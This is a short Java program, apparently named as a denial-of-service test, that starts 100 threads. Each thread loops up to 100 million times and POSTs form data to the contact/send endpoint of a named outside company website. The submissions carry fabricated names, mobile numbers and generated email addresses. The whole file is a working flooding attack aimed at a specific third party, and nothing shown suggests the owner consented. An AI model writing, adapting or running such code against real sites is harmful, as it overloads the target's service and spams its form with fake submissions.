package com.app.heike;

import java.util.HashMap;
import java.util.Map;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import com.cyb.url.SpiderHttpClient;

/**
 * 作者 : iechenyb<br>
 * 类描述: 说点啥<br>
 * 创建时间: 2017年10月26日
 */
public class DOSTest1 {
	Log log = LogFactory.getLog(DOSTest1.class);
	public static void main(String[] args) {
		for(int num=0;num<100;num++){
			new Thread(new Runnable() {
				public void run() {
					for (int i = 0; i < 10000 * 10000; i++) {//
						Map<String, String> data = new HashMap<String, String>();
						data.put("realname", "1234567890");
						data.put("company", "1234567890");
						data.put("mobile", "1383262954"+i%10);
						data.put("email", i+"@qq.com");
						data.put("mintro", "1234567890");
						System.out.println(i + "---" + 
						SpiderHttpClient.doPost("http://www.burgeon.cn/index/send", data));
					}
				}
			}).start();			
		}		
	}
}
